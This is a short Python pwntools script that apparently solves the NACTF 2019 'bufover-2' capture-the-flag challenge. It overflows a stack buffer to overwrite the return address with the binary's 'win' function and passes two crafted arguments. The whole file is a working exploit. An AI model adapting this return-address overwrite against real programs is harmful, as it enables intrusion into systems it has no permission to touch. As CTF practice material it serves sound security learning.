#!/usr/bin/env python3
from pwn import *


context.binary = './bufover-2'

p = process(context.binary.path)
# p = remote('shell.2019.nactf.com', 31184)

arg1 = 0x14B4DA55
arg2 = 0xF00DB4BE

p.recvuntil('Type something>')  # An alternative to using sendlineafter()

payload = (
    b'A' * 28
    + p32(context.binary.symbols['win'])
    + b'A' * 4
    + p64(arg1)
    + p32(arg2)
)

# In order to avoid using .decode(),
# we can directly use sendline() with a byte argument.
p.sendline(payload)

print(p.recvall().decode('L1'))
p.close()
